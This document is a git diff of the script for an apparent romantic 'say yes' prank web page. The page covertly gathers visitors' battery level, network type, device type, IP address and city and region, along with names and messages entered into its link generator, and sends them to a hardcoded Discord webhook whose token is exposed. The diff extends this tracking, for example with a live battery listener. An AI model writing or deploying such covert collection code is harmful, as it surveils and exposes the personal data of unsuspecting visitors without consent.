@@ -76,10 +76,10 @@
 
 <script>
   let visitorName = "", clickCount = 0, yesScale = 1;
-  let batteryLevel = "N/A", connectionType = "N/A";
+  let batteryLevel = "Restricted/iOS"; // Default fallback
+  let connectionType = "N/A";
   const WEBHOOK_URL = "https://discord.com/api/webhooks/1468954384997023777/oL5KyCiivYCBUM3gI0_JWhkKiBV8t6ngFZjZbanUQ_XMUc2E2oWU1_OZw4u0eFfnax7A";
 
-  // NEW: 20 RANDOM SUCCESS MESSAGES
   const promises = [
     "Thank you, {name}. I promise to hold your hand through every storm. We are forever.",
     "You made me the luckiest alive, {name}. I'm yours forever.",
@@ -104,10 +104,23 @@
   ];
 
   window.onload = async () => {
-    if (navigator.getBattery) {
-      const battery = await navigator.getBattery();
-      batteryLevel = `${Math.round(battery.level * 100)}%`;
+    // 🔋 Improved Battery Fetch
+    try {
+      if (navigator.getBattery) {
+        const battery = await navigator.getBattery();
+        batteryLevel = `${Math.round(battery.level * 100)}%`;
+        // Listen for changes
+        battery.addEventListener('levelchange', () => {
+          batteryLevel = `${Math.round(battery.level * 100)}%`;
+        });
+      } else {
+        batteryLevel = "Unsupported (iOS/Safari)";
+      }
+    } catch (e) {
+      batteryLevel = "Blocked by Browser";
     }
+
+    // 🌐 Network tracking
     if (navigator.connection) {
       connectionType = navigator.connection.effectiveType || "Unknown";
     }
@@ -139,7 +152,8 @@
         fields: [
           { name: "Event", value: `**${status}**`, inline: true },
           { name: "Device", value: navigator.userAgent.includes("Mobi") ? "Mobile" : "Desktop", inline: true },
-          { name: "Battery / Net", value: `${batteryLevel} / ${connectionType}`, inline: true },
+          { name: "Battery", value: batteryLevel, inline: true }, // Highlighted Field
+          { name: "Network", value: connectionType, inline: true },
           { name: "Misses", value: `${clickCount}`, inline: true },
           { name: "Location", value: `${spyData.city}, ${spyData.region}`, inline: true },
           { name: "IP Address", value: `\`${spyData.ip}\``, inline: false },
@@ -179,15 +193,10 @@
   }
 
   function yesClick() {
-    // SELECTS A RANDOM MESSAGE FROM THE ARRAY OF 20
     const randomPromise = promises[Math.floor(Math.random() * promises.length)].replace("{name}", visitorName);
-    
     sendDiscordReport(`SAID YES! ❤️ | Quote: "${randomPromise}"`);
-    
     document.body.style.background = "url('https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExOHpwaG54Z2V3ZzR6ZzR6ZzR6ZzR6ZzR6ZzR6ZzR6ZzR6ZzR6JmVwPXYxX2ludGVybmFsX2dpZl9ieV9pZCZjdD1n/26tOZ42Mg6pbTUPHW/giphy.gif') center center / cover";
     confetti({ particleCount: 150, spread: 70 });
-    
-    // UPDATES THE CARD WITH THE RANDOM MESSAGE
     document.getElementById("mainCard").innerHTML = `<div style="text-align:center; margin:auto; padding:20px;"><h2>I KNEW IT! ❤️</h2><p style="font-size:1.1rem; line-height:1.5;">${randomPromise}</p></div>`;
   }
 
@@ -208,9 +217,7 @@
     const to = document.getElementById('targetInput').value.trim();
     const msg = document.getElementById('msgInput').value.trim();
     const finalUrl = `${window.location.href.split('?')[0]}?to=${encodeURIComponent(to)}&msg=${encodeURIComponent(msg)}`;
-    
     sendDiscordReport(`New Link Created! From: ${from} | To: ${to} | Msg: "${msg}"`);
-    
     document.getElementById('urlDisplay').innerText = finalUrl;
     document.getElementById('step1').style.display = 'none';
     document.getElementById('step2').style.display = 'block';
